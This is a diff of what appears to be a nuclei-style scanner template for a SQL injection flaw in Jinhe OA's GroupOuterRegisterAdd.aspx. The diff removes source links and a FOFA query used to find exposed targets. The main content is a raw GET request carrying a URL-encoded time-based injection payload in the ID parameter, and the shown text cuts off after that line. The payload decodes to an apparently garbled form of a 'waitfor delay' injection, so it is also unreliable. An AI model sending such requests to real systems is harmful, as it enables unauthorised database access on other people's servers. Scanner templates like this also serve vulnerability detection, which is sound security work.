@@ -3,12 +3,8 @@ info:
   name: 金和OA GroupOuterRegisterAdd.aspx 存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/zwrd9kz85ivo4pyr'
+  description: ''
   tags: sqli,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: zwrd9kz85ivo4pyr
-    fofa: app="金和网络-金和OA"
 http:
 - raw:
   - 'GET /c6/Jhsoft.Web.AddMenu/GroupOuterRegisterAdd.aspx/?ID=%27%7B%61%69%74%66%72%20%64%65%6C%61%79%27%30%3A%30%3A%35%27%2D%2D HTTP/1.1
